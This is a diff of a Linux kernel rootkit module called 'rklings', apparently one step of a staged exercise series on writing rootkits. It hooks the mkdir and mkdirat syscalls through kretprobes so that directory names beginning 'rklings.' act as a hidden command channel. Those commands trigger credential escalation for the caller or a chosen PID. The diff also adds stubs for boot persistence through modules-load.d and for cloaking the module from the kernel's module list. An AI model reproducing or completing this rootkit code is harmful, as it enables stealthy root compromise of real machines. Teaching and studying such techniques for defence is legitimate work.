@@ -1,12 +1,9 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Your task: add persistence and module cloaking to the dispatcher.
-// Add persistence and module cloaking. See README for details.
-//
 #include <linux/cred.h>
 #include <linux/errno.h>
 #include <linux/fs.h>
 #include <linux/init.h>
+#include <linux/kernel.h>
 #include <linux/kprobes.h>
 #include <linux/list.h>
 #include <linux/module.h>
@@ -22,15 +19,67 @@
 #include <linux/types.h>
 #include <linux/uaccess.h>
 
-#define RK_PREFIX     "rklings."
-#define RK_PREFIX_LEN 8
-#define RK_PATH_MAX   128
-#define RK_CONF_PATH  "/etc/modules-load.d/rklings.conf"
+#define RK_PREFIX      "rklings."
+#define RK_PREFIX_LEN  8
+#define RK_PATH_MAX    128
+#define RK_CMD_MAX     16
+#define PERSIST_PATH   "/etc/modules-load.d/rklings.conf"
+#define MODULE_NAME_STR "rklings"
+
+/* Command dispatch (function pointer registry) */
+
+typedef int (*rk_handler_t)(const char *arg);
+
+struct rk_cmd_entry {
+	const char *key;
+	rk_handler_t handler;
+};
+
+static struct rk_cmd_entry registry[RK_CMD_MAX];
+static int nr_cmds;
+
+static int rk_cmd_register(const char *key, rk_handler_t handler)
+{
+	if (nr_cmds >= RK_CMD_MAX)
+		return -ENOSPC;
+	registry[nr_cmds].key = key;
+	registry[nr_cmds].handler = handler;
+	nr_cmds++;
+	return 0;
+}
+
+static int rk_dispatch(const char *name)
+{
+	const char *suffix = name + RK_PREFIX_LEN;
+	const struct rk_cmd_entry *best = NULL;
+	int best_len = 0;
+	int i;
+
+	for (i = 0; i < nr_cmds; i++) {
+		int klen = strlen(registry[i].key);
+
+		if (strncmp(suffix, registry[i].key, klen) != 0)
+			continue;
+		if (suffix[klen] != '\0' && suffix[klen] != '.')
+			continue;
+		if (klen > best_len) {
+			best = &registry[i];
+			best_len = klen;
+		}
+	}
+
+	if (!best)
+		return -ENOENT;
+
+	if (suffix[best_len] == '.')
+		return best->handler(suffix + best_len + 1);
+	return best->handler(NULL);
+}
+
+/* Credential escalation (from L09) */
 
 static unsigned int escalation_count;
 static int deferred_pid;
-static struct list_head *saved_prev;
-static bool module_hidden;
 
 static int rk_escalate(void)
 {
@@ -85,106 +134,80 @@ static int rk_try_deferred(void)
 	return ret;
 }
 
-// Write the module's conf file to survive reboot.
+/* Persistence */
+
+// TODO: rk_persist (filp_open + kernel_write PERSIST_PATH)
 static int rk_persist(void)
 {
 	return -ENOSYS;
 }
 
-// Remove the conf file.
+// TODO: rk_unpersist (truncate PERSIST_PATH)
 static int rk_unpersist(void)
 {
 	return -ENOSYS;
 }
 
-// Unlink the module from the kernel's module list.
+/* Module hiding */
+
+static struct list_head *saved_prev;
+
+// TODO: rk_module_hide (list_del THIS_MODULE)
 static void rk_module_hide(void)
 {
 }
 
-// Re-insert the module into the list.
+// TODO: rk_module_unhide (list_add to saved_prev)
 static void rk_module_unhide(void)
 {
 }
 
-static int rk_cmd_ping(const char *arg)
+/* Command handlers */
+
+static int cmd_ping(const char *arg)
 {
-	pr_info("rklings: dispatch: cmd=ping\n");
+	pr_info("rklings: pong\n");
 	return 0;
 }
 
-static int rk_cmd_status(const char *arg)
+static int cmd_status(const char *arg)
 {
-	pr_info("rklings: alive, escalations=%u, deferred=%d, hidden=%d\n",
-		escalation_count, deferred_pid, module_hidden);
+	pr_info("rklings: alive, escalations=%u, deferred=%d\n",
+		escalation_count, deferred_pid);
 	return 0;
 }
 
-static int rk_cmd_escalate(const char *arg)
+static int cmd_escalate(const char *arg)
 {
 	int pid;
-	int ret;
 
 	if (!arg)
 		return rk_escalate();
-
 	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
 		return -EINVAL;
-
-	ret = rk_escalate_pid(pid);
-	if (ret == -ESRCH) {
-		deferred_pid = pid;
-		return 0;
-	}
-	return ret;
+	deferred_pid = pid;
+	return 0;
 }
 
-static int rk_dispatch(const char *name)
-{
-	const char *suffix;
-	const char *dot;
-	const char *arg;
-	int cmd_len;
+// TODO: cmd_persist, cmd_unpersist, cmd_hide_module, cmd_unhide_module
+// (one-liner wrappers, register in rk_init)
 
-	suffix = name + RK_PREFIX_LEN;
-
-	dot = strchr(suffix, '.');
-	if (dot) {
-		cmd_len = dot - suffix;
-		arg = dot + 1;
-	} else {
-		cmd_len = strlen(suffix);
-		arg = NULL;
-	}
-
-	if (cmd_len == 1 && strncmp(suffix, "e", 1) == 0)
-		return rk_cmd_escalate(arg);
-	if (cmd_len == 4 && strncmp(suffix, "ping", 4) == 0)
-		return rk_cmd_ping(arg);
-	if (cmd_len == 6 && strncmp(suffix, "status", 6) == 0)
-		return rk_cmd_status(arg);
-
-	// Add dispatch entries for persist, unpersist, hide, unhide.
-
-	return -ENOENT;
-}
+/* Mkdir interception (from L09) */
 
 struct rk_mkdir_data {
 	int result;
 	bool intercepted;
 };
 
-static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
-			     const char __user *pathname)
+static int rk_do_entry(struct kretprobe_instance *inst,
+		       const char __user *pathname)
 {
-	struct rk_mkdir_data *data;
+	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
 	char buf[RK_PATH_MAX];
 	const char *base;
 	long copied;
 
-	data = (struct rk_mkdir_data *)inst->data;
 	data->intercepted = false;
-
 	copied = strncpy_from_user(buf, pathname, sizeof(buf));
 	if (copied <= 0)
 		return 0;
@@ -197,22 +220,21 @@ static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
 
 	data->result = rk_dispatch(base);
 	data->intercepted = true;
-
 	put_user('\0', (char __user *)pathname);
 	return 0;
 }
 
-static int rk_entry_mkdir(struct kretprobe_instance *inst, struct pt_regs *regs)
+static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
 {
 	struct pt_regs *uregs;
 
 	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
 	if (!uregs)
 		return 0;
-	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
+	return rk_do_entry(inst, (const char __user *)uregs->di);
 }
 
-static int rk_entry_mkdirat(struct kretprobe_instance *inst,
+static int rk_mkdirat_entry(struct kretprobe_instance *inst,
 			    struct pt_regs *regs)
 {
 	struct pt_regs *uregs;
@@ -220,15 +242,14 @@ static int rk_entry_mkdirat(struct kretprobe_instance *inst,
 	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
 	if (!uregs)
 		return 0;
-	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
+	return rk_do_entry(inst, (const char __user *)uregs->si);
 }
 
 static int rk_mkdir_return(struct kretprobe_instance *inst,
 			   struct pt_regs *regs)
 {
-	struct rk_mkdir_data *data;
+	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
 
-	data = (struct rk_mkdir_data *)inst->data;
 	if (data->intercepted)
 		regs_set_return_value(regs, (unsigned long)(long)data->result);
 	return 0;
@@ -236,7 +257,7 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 
 static struct kretprobe rk_mkdir_probe = {
     .kp.symbol_name = "__x64_sys_mkdir",
-    .entry_handler = rk_entry_mkdir,
+    .entry_handler = rk_mkdir_entry,
     .handler = rk_mkdir_return,
     .data_size = sizeof(struct rk_mkdir_data),
     .maxactive = 8,
@@ -244,11 +265,13 @@ static struct kretprobe rk_mkdir_probe = {
 
 static struct kretprobe rk_mkdirat_probe = {
     .kp.symbol_name = "__x64_sys_mkdirat",
-    .entry_handler = rk_entry_mkdirat,
+    .entry_handler = rk_mkdirat_entry,
     .handler = rk_mkdir_return,
     .data_size = sizeof(struct rk_mkdir_data),
     .maxactive = 8,
 };
+
+/* Proc interface */
 
 static int rk_proc_show(struct seq_file *m, void *v)
 {
@@ -258,13 +281,18 @@ static int rk_proc_show(struct seq_file *m, void *v)
 	else
 		seq_puts(m, "idle\n");
 	seq_printf(m, "escalations: %u\n", escalation_count);
-	seq_printf(m, "hidden: %s\n", module_hidden ? "yes" : "no");
 	return 0;
 }
 
 static int __init rk_init(void)
 {
 	int ret;
+
+	rk_cmd_register("ping", cmd_ping);
+	rk_cmd_register("status", cmd_status);
+	rk_cmd_register("e", cmd_escalate);
+
+	// TODO: register persist, unpersist, h.m, u.m commands
 
 	ret = register_kretprobe(&rk_mkdir_probe);
 	if (ret)
@@ -280,7 +308,7 @@ static int __init rk_init(void)
 
 static void __exit rk_exit(void)
 {
-	// Safety net: unhide before unload.
+	rk_module_unhide();
 	remove_proc_entry("rklings", NULL);
 	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
